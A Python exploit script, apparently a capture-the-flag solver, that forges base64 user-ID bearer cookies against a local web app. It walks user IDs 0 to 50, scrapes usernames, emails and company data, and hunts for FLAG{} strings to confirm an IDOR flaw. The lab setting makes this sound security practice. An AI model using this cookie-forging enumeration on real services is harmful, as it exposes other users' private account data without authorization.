import requests
import base64
import re
import json

base_url = "http://127.0.0.1:32773"

def test_endpoint_with_auth(user_id, endpoint="/"):
    """Test endpoint with specific user auth"""
    encoded = base64.b64encode(str(user_id).encode()).decode()
    cookie_value = f'"Bearer {encoded}"'
    
    headers = {"Cookie": f"access_token={cookie_value}"}
    
    try:
        response = requests.get(
            base_url + endpoint,
            headers=headers,
            timeout=10
        )
        return response.text, response.status_code, len(response.content)
    except Exception as e:
        return f"Error: {e}", 0, 0

# Test the original user (ID 1) more thoroughly
print("="*80)
print("EXTRACTING FULL PAGE RESPONSE FOR USER 1")
print("="*80)

response_text, status, size = test_endpoint_with_auth(1, "/")
print(f"Status: {status}")
print(f"Size: {size} bytes")

# Look for navigation links
links = re.findall(r'<a[^>]*class="nav-link"[^>]*href=["\']([^"\'\s]+)["\'][^>]*>([^<]+)</a>', response_text, re.I)
print(f"\n[NAVIGATION LINKS FOUND: {len(links)}]")
for href, text in links:
    print(f"  [{text.strip()}] -> {href}")

# Extract the actual content area
content_match = re.search(r'<div class="content">(.*?)</div>\s*</body>', response_text, re.S)
if content_match:
    content_html = content_match.group(1)
    print(f"\n[CONTENT AREA - First 800 chars]:")
    print(re.sub(r'<[^>]+>', '', content_html)[:800])
    
    # Look for any data display areas
    card_matches = re.findall(r'<div class="card[^"]*">(.*?)</div>\s*</div>', content_html, re.S)
    print(f"\n[CARD COMPONENTS: {len(card_matches)}]")
    for i, card in enumerate(card_matches):
        clean_content = re.sub(r'<[^>]+>', ' ', card).strip()
        print(f"  Card {i+1}: {clean_content[:100]}...")
else:
    print("No content area found")

# Check if we can find any user-specific data elements
print("\n" + "="*80)
print("USER DATA PATTERN SEARCH")
print("="*80)

# Look for patterns that might indicate user data
patterns_to_search = [
    (r'Username:\s*([^<\n\r]+)', "Username"),
    (r'Company:\s*([^<\n\r]+)', "Company"),
    (r'Email:\s*([^<\n\r]+)', "Email"),
    (r'User\s*ID:\s*([0-9]+)', "User ID"),
    (r'Account[^:]*:\s*([^<\n\r]+)', "Account"),
    (r'Profile[^:]*:\s*([^<\n\r]+)', "Profile"),
]

for pattern, name in patterns_to_search:
    matches = re.findall(pattern, response_text, re.I | re.M)
    if matches:
        print(f"{name} found: {[m.strip() for m in matches][:3]}")

# Now test if we can access other users' data
print("\n" + "="*80)
print("IDOR TEST - Accessing Other Users")
print("="*80)

# Test a range of user IDs
interesting_ids = [0, 1, 2, 3, 5, 10, 15, 20, 50]
user_data = {}

for user_id in interesting_ids:
    print(f"\n[Testing User ID: {user_id}]")
    
    resp, status, size = test_endpoint_with_auth(user_id, "/")
    
    # Extract key data
    extracted_data = {}
    for pattern, name in patterns_to_search:
        matches = re.findall(pattern, resp, re.I | re.M)
        if matches:
            extracted_data[name.lower()] = [m.strip() for m in matches]
    
    user_data[user_id] = {
        'status': status,
        'size': size,
        'data': extracted_data
    }
    
    print(f"  Size: {size}B | Status: {status}")
    if extracted_data:
        for key, values in extracted_data.items():
            print(f"  {key.capitalize()}: {values[:2]}")
    
    # Check for flag
    flags = re.findall(r'FLAG\{[^}]+\}', resp)
    if flags:
        print(f"  [!] FLAG: {flags[0]}")
        user_data[user_id]['flag'] = flags[0]
    else:
        # Try other flag patterns
        variations = re.findall(r'flag\{[^}]+\}', resp, re.I)
        if variations:
            print(f"  [!] Possible flag: {variations[0]}")
            user_data[user_id]['flag'] = variations[0]

# Compare responses to find differences
print("\n" + "="*80)
print("RESPONSE COMPARISON")
print("="*80)

# Get base response for user 1
base_resp, _, base_size = test_endpoint_with_auth(1, "/")

print(f"Base (User 1): {base_size}B")

for user_id in interesting_ids[1:]:
    resp, _, size = test_endpoint_with_auth(user_id, "/")
    
    if size != base_size:
        print(f"User {user_id:3d}: {size:4d}B | SIZE DIFFERENCE (+{size-base_size:+d})")
        
        # Find what data is different
        for pattern, name in patterns_to_search:
            base_matches = set(re.findall(pattern, base_resp, re.I))
            user_matches = set(re.findall(pattern, resp, re.I))
            
            if base_matches != user_matches:
                new_data = user_matches - base_matches
                if new_data:
                    print(f"  {name}: {[m.strip() for m in new_data][:3]}")
    elif resp != base_resp:
        print(f"User {user_id:3d}: {size:4d}B | Content differs but same size")
    else:
        print(f"User {user_id:3d}: {size:4d}B | Identical to User 1")

# Check for any flags across all users
print("\n" + "="*80)
print("SYSTEMATIC FLAG SEARCH")
print("="*80)

flags_found = []

for user_id in range(0, 51):
    resp, status, size = test_endpoint_with_auth(user_id, "/")
    
    flags = re.findall(r'FLAG\{[^}]+\}', resp)
    if flags:
        flags_found.append((user_id, flags[0]))
        print(f"[!] User {user_id}: {flags[0]}")

if flags_found:
    print("\n" + "!"*80)
    print("FLAGS FOUND!")
    print("!"*80)
    for uid, flag in flags_found:
        print(f"User {uid}: {flag}")
else:
    print("\n[X] No FLAG{} patterns found")
    
    # Final desperate attempt - search for any unusual patterns
    print("\n[SEARCHING FOR HIDDEN PATTERNS]")
    
    for user_id in [0, 1, 5, 10, 20]:
        resp, _, _ = test_endpoint_with_auth(user_id, "/")
        
        # Look for base64 encoded strings
        b64_patterns = re.findall(r'[A-Za-z0-9+/]{15,}={0,2}', resp)
        if len(b64_patterns) > 5:  # More than just normal HTML base64
            print(f"User {user_id}: Unusual base64-like patterns found")
        
        # Look for hex strings
        hex_patterns = re.findall(r'[a-f0-9]{32,}', resp.lower())
        if hex_patterns:
            print(f"User {user_id}: Hex strings found: {hex_patterns[:3]}")

print("\n" + "="*80)
print("FINAL RESULTS")
print("="*80)

if flags_found:
    print("[SUCCESS] IDOR vulnerability exploited successfully!")
    print(f"Found {len(flags_found)} flags:")
    for uid, flag in flags_found:
        print(f"  {flag}")
else:
    print("[PARTIAL] IDOR vulnerability confirmed (cookie manipulation works)")
    print("However, no flags were found in accessible data")
    print("\nRecommendations:")
    print("- Test other endpoints for user-specific data")
    print("- Check response patterns more carefully")
    print("- Verify authentication flow is complete")
